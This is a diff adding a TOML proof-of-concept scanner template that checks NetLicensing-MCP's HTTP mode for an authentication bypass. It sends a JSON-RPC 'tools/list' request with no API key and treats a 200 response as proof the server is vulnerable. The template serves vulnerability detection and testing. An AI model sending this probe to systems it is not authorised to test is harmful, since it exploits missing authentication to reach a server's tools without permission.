@@ -1,0 +1,31 @@
+[info]
+author = "ave"
+description = "检测 NetLicensing-MCP HTTP 传输模式下的认证绕过漏洞。向 MCP 端点发送无 API 密钥的 JSON-RPC 请求，验证服务器是否未返回 401 拒绝。"
+id = "POC-AVE-2026-0516"
+name = "NetLicensing-MCP HTTP Mode Authentication Bypass PoC"
+severity = "high"
+tags = ["ave-2026-0516"]
+vuln_id = [
+    "CVE-2026-54446",
+    "AVE-2026-0516",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
